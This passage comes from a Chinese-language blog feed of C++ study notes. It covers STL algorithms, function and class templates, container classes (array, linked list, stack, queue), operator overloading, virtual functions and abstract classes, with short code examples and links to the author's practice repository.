为真的元素</span></span></span></span><br></pre></td></tr></table></figure></p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%BA%8F%E5%88%97%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/main.cpp">不可变序列算法示例</a></p><h2 id="可变序列算法">可变序列算法</h2><p>可以修改它们操作的容器对象，包括复制、删除、替换、反转、旋转、交换、分区、去重、填充、洗牌序列和生成序列的算法。</p><p><imgsrc="https://pic3.zhimg.com/80/v2-ec3de91c8801e4fbb7993a038d8ba58e_1440w.png" /></p><p><imgsrc="https://picx.zhimg.com/80/v2-e1eedaedbe50397fdac1453674369c25_1440w.png" /></p><p>示例： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> ForwardIterator, <span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fill</span><span class="params">(ForwardIterator first, ForwardIterator last, <span class="type">const</span> T&amp; x)</span></span>;</span><br><span class="line"><span class="comment">//将 [first, last) 范围内的所有元素重写为 x。</span></span><br></pre></td></tr></table></figure></p><div class="note danger flat"><p><ahref="https://blog.csdn.net/qq_27788829/article/details/51181080?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-51181080-blog-80187847.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-51181080-blog-80187847.pc_relevant_default&amp;utm_relevant_index=1">remove_if的欺骗性</a></p></div><blockquote><p>删除是通过移动（通过 copy assignment （直到 C++11）moveassignment （自 C++11起））范围内的元素，以使不需要删除的元素出现在范围的开头。保留的元素的相对顺序保持不变，容器的<em>物理</em>大小不变。指向新<em>逻辑</em>结束和<em>物理</em>结束之间的元素的迭代器仍然可以解引用，但元素本身具有未指定的值（根据 <ahref="https://en.cppreference.com/w/cpp/named_req/MoveAssignable"title="cpp/named req/MoveAssignable">MoveAssignable</a> 后置条件）。</p></blockquote><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E5%8F%AF%E5%8F%98%E5%BA%8F%E5%88%97%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/main.cpp">可变序列算法示例</a></p><h2 id="排序和搜索算法">排序和搜索算法</h2><ul><li>对序列进行排序</li><li>合并两个有序序列</li><li>搜索有序序列</li><li>对有序序列进行集合操作</li><li>堆算法</li></ul><p><imgsrc="https://pic2.zhimg.com/80/v2-d880ec033f01b154525a1600bad9c14f_1440w.jpeg" /></p><p><imgsrc="https://pic3.zhimg.com/80/v2-e367dca4110be05e688ba80abffe29be_1440w.jpeg" /></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">RandomAccessIterator</span> , <span class="keyword">class</span> <span class="title class_">UnaryPredicate</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(RandomAccessIterator first, RandomAccessIterator last, UnaryPredicate comp)</span></span>;</span><br><span class="line"><span class="comment">//使用函数对象 comp 作为 &quot;&lt;&quot; 对 [first, last) 范围内的数据进行排序</span></span><br></pre></td></tr></table></figure><blockquote><p>sort 要求 first 和 last 为随机迭代器类型，因为 sort的具体实现使用快速排序，使用随机迭代器是出于效率考虑。</p></blockquote><h2 id="数值算法">数值算法</h2><p>查找序列中元素的“和”、部分“和”、相邻元素的“差”或两个序列的内积。查找“和”的“+”、查找“差”的“-”以及查找内积的“+”和“·”都可以通过函数对象指定。</p><p><imgsrc="https://pic2.zhimg.com/80/v2-b20e0971749bf96f4e9e97fdb6121fd2_1440w.png" /></p><p>示例： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>, <span class="keyword">class</span> <span class="title class_">BinaryFunction</span>&gt; ▫ <span class="function">OutputIterator <span class="title">partial_sum</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result, BinaryFunction op)</span></span>;</span><br><span class="line"><span class="comment">//查找 [first, last) 范围内元素的部分“和”（所谓部分“和”是与输入序列长度相同的序列，其中第 n 项是输入序列前 n 个元素的“和”）</span></span><br><span class="line"><span class="comment">//使用函数对象 op 作为 &quot;+&quot; 运算符，通过 result 输出结果，返回指向输出序列最后一个元素之后的迭代器</span></span><br></pre></td></tr></table></figure></p><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/%E6%95%B0%E5%80%BC%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B">数值算法示例</a></p><h1 id="综合示例---银行账户管理">综合示例 - 银行账户管理</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update4">源代码+ 更新</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Templates and Data Organization</title>
      <link href="/zh/2022/08/04/CPP/Templates%20and%20Data%20Organization/"/>
      <url>/zh/2022/08/04/CPP/Templates%20and%20Data%20Organization/</url>
      
        <content type="html"><![CDATA[<h1 id="函数模板和类模板">函数模板和类模板</h1><p>模板可以实现<strong>参数多态性</strong>，它对程序处理的对象类型进行参数化，使得单个程序能够处理多种<strong>不同类型</strong>的对象。</p><h2 id="函数模板">函数模板</h2><p>函数模板的目的是为了避免重复编写仅在<strong>数据类型</strong>上有所不同的函数，从而大大提高代码的可重用性，增强软件开发效率。</p><p>语法形式是在函数定义前添加语句<code>template&lt;模板参数列表&gt;</code></p><p>模板参数列表的内容：</p><ul><li>类型参数：class（或 typename）标识符</li><li>常量参数：类型说明符标识符</li><li>模板参数：template<参数列表> class 标识符</li></ul><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通用绝对值函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">abs</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x&gt;<span class="number">0</span> ? x : -x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>函数模板与函数在本质上是不同的</p><ol type="1"><li>函数模板本身<strong>不会生成</strong>任何对象代码；只有函数模板的实例才会生成对象代码。</li><li>被多个源文件引用的函数模板需要与函数体一起放在头文件中，而不仅仅是像普通函数那样的声明。</li><li>函数指针只能指向函数模板的实例，<strong>不能指向函数模板</strong>。</li></ol></div><h2 id="类模板">类模板</h2><p>使用类模板可以定义类的模式，使得某些数据成员、某些成员函数的参数、返回值或类中的局部变量可以采用任意类型。</p><p>类模板的声明方式与函数模板相同，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在类模板外定义成员函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;模板参数表&gt;</span><br><span class="line">类型名 类名&lt;模板参数标识符列表&gt;::函数名(参数表)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用模板类定义对象</span></span><br><span class="line">模板名&lt;模版参数类型&gt;对象名<span class="number">1</span>,...,对象名n;</span><br></pre></td></tr></table></figure><h1 id="线性组">线性组</h1><p>线性组顾名思义，其元素的位置对应于它们的相对关系。它们可以分为直接访问、顺序访问和索引访问。直接访问意味着可以直接跳转到需要访问的位置，而不需要遵循顺序，而顺序访问只能根据元素排列顺序从头开始访问。</p><h2 id="直接访问组---数组类">直接访问组 - 数组类</h2><p>需要设计一个可变长度的数组，<ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%95%B0%E7%BB%84%E7%B1%BB%E6%A8%A1%E7%89%88/Array.h">点击查看源代码</a>，并列出一些需要注意的语法要点。</p><div class="note info flat"><p>语法规则规定“=”、“[ ]”、“()”、“-&gt;”只能作为成员函数进行重载，而派生类中的“=”运算符函数将始终隐藏基类中的“=”运算符。</p></div><p>如果我们想在程序中像普通数组一样使用 Array类对象，我们需要重载指针转换运算符。</p><h3 id="指针转换运算符的作用">指针转换运算符的作用</h3><p>为了说明重载指针转换运算符的必要性，先看以下程序：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span> <span class="params">(<span class="type">int</span> *p, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        cin&gt;&gt;p[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">read</span>(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，read 函数的第一个参数是一个 int 指针，而数组名 a 是一个 int地址常量，因此类型完全匹配。如果我们想在程序中像普通数组一样使用 Array类对象，可以将 main 函数修改如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function">Arrays&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="built_in">read</span>(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发生什么呢？这次调用 read时，会发现实际参数类型与形式参数类型不同。此时，编译系统会尝试进行自动类型转换：将对象名转换为int * 类型。由于 a是一个自定义类型对象，编译系统提供的自动转换函数<strong>无法实现这种转换</strong>，所以我们需要编写自己的重载指针类型转换函数。在 C++ 中，如果你想隐式或显式地将自定义类型 T 的对象转换为类型 S，可以将operator S 定义为 T 的成员函数。这样，在隐式将 T 类型对象转换为 S类型，或使用 static_cast 显式转换为 S类型时，将调用该成员函数。转换运算符的重载函数不需要指定返回值类型，因为在这种情况下<strong>重载函数的返回类型与运算符名称一致</strong>，因此C++ 标准规定此类函数不能指定返回值类型（也不应写为 void）。当对象本身是常量时，为了避免通过指针修改数组内容，对象只能转换为常量指针。</p><p>在这个 Array 类中重载指针转换运算符的方式如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::<span class="keyword">operator</span> T *()  <span class="comment">//不用写返回值的类型</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> list;<span class="comment">//数组的首地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="顺序访问组---链表类">顺序访问组 - 链表类</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LinkedList.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LINKEDLIST_H </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINKEDLIST_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Node.h&quot;</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;T&gt; *front, *rear;      <span class="comment">//头尾指针</span></span><br><span class="line">    Node&lt;T&gt; *prevPtr, *currPtr; <span class="comment">//记录当前遍历位置的指针，通过插入和删除操作更新</span></span><br><span class="line">    <span class="type">int</span> size;                   <span class="comment">//链表中的元素数量</span></span><br><span class="line">    <span class="type">int</span> position;               <span class="comment">//当前元素在链表中的位置索引。由 reset 函数使用</span></span><br><span class="line">    <span class="comment">//生成带有数据域 item 和指针域 ptrNext 的新节点</span></span><br><span class="line">    <span class="function">Node&lt;T&gt; *<span class="title">newNode</span><span class="params">(<span class="type">const</span> T &amp;item, Node&lt;T&gt; *ptrNext = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">freeNode</span><span class="params">(Node&lt;T&gt; *p)</span></span>; <span class="comment">//释放节点</span></span><br><span class="line">    <span class="comment">//将链表 L 复制到当前链表（假设当前链表为空），由拷贝构造函数和运算符 = 调用</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">copy</span><span class="params">(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedList</span>();                                     <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">LinkedList</span>(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L);               <span class="comment">//拷贝构造函数</span></span><br><span class="line">    ~<span class="built_in">LinkedList</span>();                                    <span class="comment">//析构函数</span></span><br><span class="line">    LinkedList&lt;T&gt; &amp;<span class="keyword">operator</span>=(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L); <span class="comment">//重载赋值运算符</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span> <span class="type">const</span></span>;                              <span class="comment">//返回链表中的元素数量</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span> <span class="type">const</span></span>;                             <span class="comment">//链表是否为空</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reset</span><span class="params">(<span class="type">int</span> pos = <span class="number">0</span>)</span></span>;                          <span class="comment">//初始化游标位置</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">()</span></span>;                                      <span class="comment">//游标移动到下一个节点</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">endOfList</span><span class="params">()</span> <span class="type">const</span></span>;                           <span class="comment">//游标是否到达链表末尾</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">currentPosition</span><span class="params">()</span> <span class="type">const</span></span>;                      <span class="comment">//返回当前游标位置</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertFront</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                  <span class="comment">//在头部插入节点</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertRear</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                   <span class="comment">//在尾部添加节点</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertAt</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                     <span class="comment">//在当前节点之前插入节点</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertAfter</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                  <span class="comment">//在当前节点之后插入节点</span></span><br><span class="line">    <span class="function">T <span class="title">deleteFront</span><span class="params">()</span></span>;                                  <span class="comment">//删除头节点</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteCurrent</span><span class="params">()</span></span>;                             <span class="comment">//删除当前节点</span></span><br><span class="line">    <span class="function">T &amp;<span class="title">data</span><span class="params">()</span></span>;                                        <span class="comment">//返回对当前节点成员数据的引用</span></span><br><span class="line">    <span class="function"><span class="type">const</span> T &amp;<span class="title">data</span><span class="params">()</span> <span class="type">const</span></span>;                            <span class="comment">//返回对当前节点成员数据的常量引用</span></span><br><span class="line">    <span class="comment">//清空链表：释放所有节点的内存空间。由析构函数和运算符=调用</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// LINKEDLIST_H </span></span></span><br><span class="line"><span class="comment">//链表类模板函数实现代码可以从网上下载</span></span><br></pre></td></tr></table></figure><p>链表的基本操作：</p><ul><li>生成链表</li><li>插入节点</li><li>查找节点</li><li>删除节点</li><li>遍历链表</li><li>清空链表</li></ul><h2 id="栈类">栈类</h2><p><strong>栈类模板实现</strong>，<ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/stack_calculator/Stack.h">点击查看源代码</a>。</p><p>栈元素实际上可以使用<strong>数组</strong>或<strong>链表</strong>来表示。</p><p>栈的基本操作：</p><ul><li>初始化</li><li>压栈</li><li>弹栈</li><li>清空栈</li><li>访问栈顶元素</li><li>检查栈状态（满、空）</li></ul><h2 id="队列类">队列类</h2><p>设计为使用数组的循环队列，这在添加和删除时相当麻烦。实际上，我认为使用链表就不需要循环实现。</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E9%98%9F%E5%88%97%E7%B1%BB%E6%A8%A1%E7%89%88/Queue.h">点击查看源代码</a></p><h1 id="组数组的组织">组数组的组织</h1><p>简单的排序和搜索相当基础，因此这里插入一些图片和链接以便更好地理解。</p><p><imgsrc="https://pic3.zhimg.com/80/v2-7da3a687b4b607d415bbf4617768727f_1440w.jpeg" /></p><p><a href="https://labuladong.github.io/algo/1/11/">I wrote a poemabout binary search - labuladong</a></p><h1 id="综合示例---个人银行账户管理程序的改进">综合示例 -个人银行账户管理程序的改进</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_3">点击这里查看源代码</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polymorphism</title>
      <link href="/zh/2022/07/31/CPP/Polymorphism/"/>
      <url>/zh/2022/07/31/CPP/Polymorphism/</url>
      
        <content type="html"><![CDATA[<h1 id="多态概述">多态概述</h1><p>多态是指当相同的消息被不同类型的对象接收时，表现出不同的行为。消息指的是<strong>对类成员函数的调用</strong>，而不同的行为指的是不同的实现，即<strong>调用不同的函数</strong>。</p><p>最简单的例子是<strong>“+”</strong>运算符，它可以在整数、浮点数和双精度浮点数之间实现加法，包括混合类型加法。当不同类型的对象接收到相同的”+“消息时，使用不同的方法进行加法操作。这就是多态。</p><h2 id="多态的类型">多态的类型</h2><p>面向对象的多态可以分为四类：</p><ul><li>重载多态</li><li>强制转换多态</li><li>包含多态</li><li>参数化多态</li></ul><p>前两者称为<strong>特定多态</strong>，后两者称为<strong>普遍多态</strong>。</p><ol type="1"><li>重载多态指的是普通函数和类成员函数的重载，当然也包括<strong>运算符重载</strong>。</li><li>强制转换多态，简单来说，就是当<strong>+</strong>涉及混合类型时，会进行类型强制转换，这是强制转换多态的一个实例。</li><li>包含多态主要指的是在类层次结构中定义在不同类中同名的成员函数的多态行为，通过<strong>虚函数</strong>实现。</li><li>参数化多态与类模板相关，使用时必须给出实际类型以便实例化。</li></ol><p>本文将介绍运算符重载和虚函数。</p><h2 id="多态的实现">多态的实现</h2><p>从实现的角度来看，多态可以分为两类：<strong>编译时多态和运行时多态</strong>。前者顾名思义，在编译期间确定同名操作的具体操作对象。这个确定操作具体对象的过程称为<strong>绑定</strong>。</p><p>绑定是指将计算机程序彼此关联的过程，即<strong>将标识符与存储地址连接起来</strong>的过程。在面向对象的术语中，它是将消息与对象的方法结合的过程。</p><p>绑定也分为两种类型：<strong>静态绑定</strong>和<strong>动态绑定</strong>。</p><p>当绑定在编译和链接阶段完成时，称为<strong>静态绑定</strong>。也称为早期绑定。</p><p>与静态绑定相对，<strong>动态绑定</strong>，顾名思义，是在程序执行期间完成的绑定。也称为晚期绑定。它对应于运行时多态。</p><h1 id="运算符重载">运算符重载</h1><p>运算符重载是为现有运算符赋予多重含义，相同的运算符在作用于不同类型的数据时产生不同的行为。</p><h2 id="运算符重载的规则">运算符重载的规则</h2><ol type="1"><li>在C++中，除了少数运算符外，所有运算符都可以被重载，且<strong>只能重载现有运算符</strong>。</li><li>重载后，运算符的优先级和结合性不会改变。</li><li>运算符应根据新类型数据的实际需求进行适当修改。重载的功能应与原始功能相似，不能改变操作数的数量，且至少一个必须是自定义类型（否则不称为重载）。</li></ol><div class="note danger flat"><p>几个不能重载的运算符：类成员运算符<strong>“.”</strong>，成员函数指针运算符”.*“，作用域解析运算符”::“，和三元运算符”?:”</p></div><hr /><p>运算符重载有两种形式：<strong>作为类的非静态成员函数的重载</strong>和<strong>作为非成员函数的重载</strong>。</p><p>作为类的非静态成员函数和非成员函数的重载的一般形式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">返回类型 <span class="keyword">operator</span> 运算符(形参表)</span><br><span class="line">&#123;</span><br><span class="line">  函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>当作为非成员函数重载时，有时需要访问类中的成员，此时可以声明为友元函数。</p></div><p><strong>注意</strong>：</p><p>当运算符作为类的成员函数重载时，函数参数的数量比原始操作数少一个（后缀”++“和”–“除外）；当作为非成员函数重载时，参数的数量等于原始操作数的数量。原因在于，当作为类的成员函数重载时，第一个操作数成为函数调用的目标对象，因此不需要出现在参数列表中，函数体可以直接访问第一个操作数的成员。当作为非成员函数重载时，运算符的所有操作数必须通过参数显式传递。</p><h2 id="作为成员函数的运算符重载">作为成员函数的运算符重载</h2><p>主要是单目运算符和双目运算符之间的区别。</p><p>对于双目运算符，前面的类的数据类型应为该类的成员函数，后面的类的数据类型应放在形式参数中。</p><p>单目运算符分为两种类型：<strong>前缀单目运算符</strong>和<strong>后缀单目运算符</strong>。（++,–是单目运算符，名称根据位置不同而异）</p><ul><li><p>对于前缀单目运算符，重载的成员函数没有形式参数；</p></li><li><p>对于后缀单目运算符，函数必须有一个int形式参数。这个int参数在操作中没有实际用途，仅用于区分前缀和后缀。</p></li></ul><h2 id="作为非成员函数的运算符重载">作为非成员函数的运算符重载</h2><p>对于双目运算符，前后两个数据类型中，只需一个是自定义数据类型即可启用运算符重载，两个数据类型都需要作为函数形式参数。</p><p>对于前缀单目运算符，形式参数是被操作的数据类型。</p><p>对于后缀单目运算符，有两个形式参数：一个是被操作的数据类型，另一个是int数据类型。</p><div class="note success flat"><p>不难看出，成员函数和非成员函数之间的主要区别在于，成员函数隐式地将前一个操作数视为函数调用的对象，而非成员函数则不这样做。</p></div><hr /><p>本节使用一个Complex（复数类）来说明</p><p><ahref="https://raw.githubusercontent.com/hustlixiang21/cpp-practice/main/%E5%AE%9D%E8%B4%9D%E6%96%87%E4%BB%B6/3.4.bmp">点击查看问题图片</a>（CUG实验问题）</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/Complex/main.cpp">GitHub上的源代码</a></p><h1 id="虚函数">虚函数</h1><p>虚函数是动态绑定的基础。虚函数必须是非静态成员函数。通过派生虚函数，可以在类层次结构中实现运行时的多态。</p><h2 id="一般虚函数成员">一般虚函数成员</h2><p>声明语法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">virtual</span> 函数类型 函数名(形参表)；</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>虚函数声明只能出现在类定义中的函数原型声明中，而不能出现在成员函数实现中。</p></div><p>运行时多态所需的条件：</p><ol type="1"><li>赋值兼容性规则</li><li>声明虚函数</li><li>通过成员函数调用或通过指针或引用访问虚函数</li></ol><p>如果派生类没有显式声明虚函数，系统将遵循以下规则来确定派生类中的函数成员是否为虚函数：</p><ol type="1"><li>函数是否与基类的虚函数同名。</li><li>函数的参数数量和对应的参数类型是否与基类的虚函数相同。</li><li>函数的返回类型是否与基类的虚函数相同，或满足指针和引用类型返回值的赋值兼容性规则。</li></ol><p>如果满足上述条件，派生类中的虚函数将<strong>覆盖</strong>基类中同名的所有函数，这就是作用域隐藏。当然，也可以通过作用域解析运算符”::“进行区分。</p><p>需要强调的是，动态绑定仅在通过基类指针或引用调用虚函数时发生。</p><div class="note success flat"><p>实际上，是否在派生类的虚函数前添加虚关键字并不重要，但建议添加以使其更清晰地表明它们是虚函数。</p></div><p><strong>对象切片</strong>是指使用派生类的实例初始化基类对象，这会调用基类的拷贝构造函数。即，只有与基类相同的数据成员会被复制，其余将被忽略。此时，这个基类对象与派生类对象没有关系，这与类型兼容性规则非常一致。</p><h2 id="虚析构函数">虚析构函数</h2><p>虚构造函数不能声明，但虚析构函数可以声明。语法是在普通析构函数前添加虚关键字。</p><p>那么，什么时候需要使用虚析构函数呢？</p><p>当基类指针指向派生类对象时，如果此时执行<code>delete(基类指针)</code>，将调用基类析构函数而不是派生类析构函数，导致内存泄漏。（我实际上认为这种情况几乎不会遇到，仅需了解即可）与普通成员函数的多态差别不大。</p><h1 id="纯虚函数和抽象类">纯虚函数和抽象类</h1><h2 id="纯虚函数">纯虚函数</h2><p>纯虚函数是基类中声明但没有定义的虚函数，要求任何派生类必须定义自己的实现。在基类中实现纯虚函数的方法是在函数原型后添加”=0”，例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span></span><br></pre></td></tr></table></figure><p>我最大的疑问是为什么要引入纯虚函数？</p><ol type="1"><li>为了方便使用多态特性，我们通常需要在基类中定义虚函数。</li><li>在许多情况下，基类本身生成对象是不合理的。</li></ol><p>例如，动物作为基类可以派生出老虎和孔雀等子类，但动物本身生成对象显然是不合理的。</p><p>为了解决上述问题，引入了纯虚函数的概念。当一个函数被定义为纯虚函数时，编译器要求它必须在派生类中被重写以实现多态。包含纯虚函数的类称为抽象类，不能生成对象。这很好地解决了上述两个问题。声明纯虚函数的类是抽象类。因此，<strong>用户不能创建抽象类的实例</strong>，只能创建其派生类的实例（实现了基类中纯虚函数定义的类）。纯虚函数最显著的特征是：它们<strong>必须在继承类中重新声明</strong>（末尾没有=0，否则派生类无法实例化），并且<strong>通常在抽象类中没有定义</strong>。定义纯虚函数的目的是<strong>使派生类仅继承函数接口</strong>。纯虚函数的意义在于允许所有类对象（主要是派生类对象）执行纯虚函数的操作，但该类无法为纯虚函数提供合理的默认实现。因此，在类中声明纯虚函数是在告诉子类设计者：“你必须提供纯虚函数的实现，但我不知道你将如何实现它。”</p><h2 